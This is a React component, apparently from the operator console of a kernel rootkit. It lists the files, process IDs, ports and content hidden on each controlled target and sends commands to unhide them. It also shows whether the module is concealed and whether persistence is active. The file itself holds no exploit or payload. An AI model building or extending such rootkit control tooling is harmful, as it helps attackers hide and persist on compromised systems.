import { useEffect, useState } from 'react'
import { Activity, FileText, Network, Search, Eye } from 'lucide-react'

function Section({ title, children }) {
  return (
    <div>
      <h3 className="text-xs font-bold uppercase tracking-widest text-fg-3 mb-3">{title}</h3>
      {children}
    </div>
  )
}

function InfoRow({ label, value, color }) {
  return (
    <div className="flex items-center justify-between px-4 py-2.5 border-b-2 border-border last:border-b-0">
      <span className="text-xs font-bold uppercase tracking-wider text-fg-3">{label}</span>
      <span className={`font-mono text-sm ${color || ''}`}>{value}</span>
    </div>
  )
}

export function OverviewTab({ target: t, cmd, query, busy }) {
  const [selected, setSelected] = useState([])
  const [restoring, setRestoring] = useState(false)
  const [restoreError, setRestoreError] = useState('')
  const hidden = {
    file: (t.hidden?.file || []).length,
    pid: (t.hidden?.pid || []).length,
    port: (t.hidden?.port || []).length,
    content: (t.hidden?.content || []).length,
  }
  const total = hidden.file + hidden.pid + hidden.port + hidden.content
  const categories = [
    { key: 'file', label: 'Files', icon: FileText, items: t.hidden?.file || [], unhide: 'UNHIDE FILE' },
    { key: 'pid', label: 'PIDs', icon: Activity, items: t.hidden?.pid || [], unhide: 'UNHIDE PID' },
    { key: 'port', label: 'Ports', icon: Network, items: t.hidden?.port || [], unhide: 'UNHIDE PORT' },
    { key: 'content', label: 'Content', icon: Search, items: t.hidden?.content || [], unhide: 'UNHIDE CONTENT' },
  ]
  const entries = categories.flatMap(category => category.items.map(item => ({
    key: `${category.key}\0${item}`, item, command: `${category.unhide} ${item}`,
  })))

  useEffect(() => {
    const valid = new Set(entries.map(entry => entry.key))
    setSelected(current => current.filter(key => valid.has(key)))
  }, [t.hidden])

  const toggleSelected = key => setSelected(current =>
    current.includes(key) ? current.filter(value => value !== key) : [...current, key])

  const restoreSelected = async () => {
    const chosen = entries.filter(entry => selected.includes(entry.key))
    if (!chosen.length || !window.confirm(`Restore ${chosen.length} selected item${chosen.length === 1 ? '' : 's'}?`)) return
    setRestoring(true)
    setRestoreError('')
    const failed = []
    for (const entry of chosen) {
      const result = await query(entry.command, t.id)
      if (!result.ok) failed.push(entry.key)
    }
    setSelected(failed)
    setRestoring(false)
    if (failed.length) setRestoreError(`${failed.length} item${failed.length === 1 ? '' : 's'} could not be restored.`)
  }

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-0 h-full">
      <div className="border-b-2 lg:border-b-0 lg:border-r-2 border-border p-5 overflow-auto">
        <Section title={<>Hidden <span className="nb-badge bg-main text-main-fg ml-1">{total}</span></>}>
          {total > 0 && (
            <div className="flex items-center gap-2 mb-3">
              <button className="nb-btn px-3 py-1.5 text-xs"
                onClick={() => setSelected(selected.length === entries.length ? [] : entries.map(entry => entry.key))}
                disabled={restoring}>
                {selected.length === entries.length ? 'Clear selection' : 'Select all'}
              </button>
              {selected.length > 0 && (
                <button className="nb-btn px-3 py-1.5 text-xs text-red"
                  onClick={restoreSelected} disabled={!t.online || busy || restoring}>
                  {restoring ? 'Restoring...' : `Restore selected (${selected.length})`}
                </button>
              )}
            </div>
          )}
          {restoreError && <div className="text-xs font-bold text-red mb-3">{restoreError}</div>}
          {total === 0 && (
            <div className="text-sm text-fg-3 py-4">Nothing hidden yet. Use the Processes, Ports, or Files tabs to hide items.</div>
          )}
          {categories.filter(c => c.items.length > 0).map(cat => (
            <div key={cat.key} className="mb-3">
              <div className="flex items-center gap-1.5 mb-1.5">
                <cat.icon size={12} className="text-fg-3" />
                <span className="text-[10px] font-bold uppercase tracking-widest text-fg-3">{cat.label}</span>
                <span className="text-[10px] font-mono text-fg-3">{cat.items.length}</span>
              </div>
              <div className="space-y-0.5">
                {cat.items.map((item, i) => (
                  <div key={i} className="flex items-center justify-between gap-2 px-3 py-1.5 rounded-[var(--radius)] bg-secondary border border-border group">
                    <label className="flex items-center gap-2 min-w-0 cursor-pointer">
                      <input type="checkbox" checked={selected.includes(`${cat.key}\0${item}`)}
                        onChange={() => toggleSelected(`${cat.key}\0${item}`)} disabled={restoring} />
                      <span className="font-mono text-xs truncate">{item}</span>
                    </label>
                    <button
                      className="p-0.5 text-fg-3 hover:text-red opacity-0 group-hover:opacity-100 transition-opacity shrink-0"
                      title={`Unhide ${item}`}
                      onClick={() => cmd(`${cat.unhide} ${item}`)}
                      disabled={!t.online || busy}
                    >
                      <Eye size={12} />
                    </button>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </Section>
      </div>

      <div className="p-5 overflow-auto">
        <Section title="System">
          <div className="nb-card-flat overflow-hidden">
            <InfoRow label="Hostname" value={t.hostname || t.id} />
            <InfoRow label="ID" value={t.id} />
            <InfoRow label="Kernel" value={`${t.kernel} ${t.arch}`} />
            {t.build_id && <InfoRow label="Build" value={t.build_id} />}
            {t.peer && <InfoRow label="Peer" value={t.peer} />}
            <InfoRow label="Module" value={t.module_hidden ? 'Hidden' : 'Visible'} color={t.module_hidden ? 'text-green' : 'text-amber'} />
            <InfoRow label="Persist" value={t.persisted ? 'Active' : 'Off'} color={t.persisted ? 'text-green' : 'text-fg-3'} />
            <InfoRow label="Status" value={t.online ? 'Online' : 'Offline'} color={t.online ? 'text-green' : 'text-red'} />
            <InfoRow label="Hidden" value={`${total} items`} />
          </div>
        </Section>
      </div>
    </div>
  )
}
